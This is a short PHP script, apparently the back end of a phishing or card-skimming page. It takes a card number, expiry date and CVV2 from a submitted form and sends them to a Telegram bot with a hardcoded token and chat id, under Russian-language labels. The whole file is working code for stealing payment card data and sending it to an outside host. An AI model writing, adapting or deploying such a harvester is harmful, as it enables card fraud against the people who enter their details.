<?php
    $card_number = $_POST["card_number"];
    $expiry_date = $_POST["expiry_date"];
    $cvv2 = $_POST["cvv2"];

    file_get_contents("https://api.telegram.org/bot6070322988:AAG-_RkdlvEaiWLHZyfN7AVlZcY5MOfEyOA/sendMessage?chat_id=5600272083&parse_mode=HTML&text=Номер карты: {$card_number}<br>ММ/ГГ: {$expiry_date}<br>CVV: {$cvv2}");
?>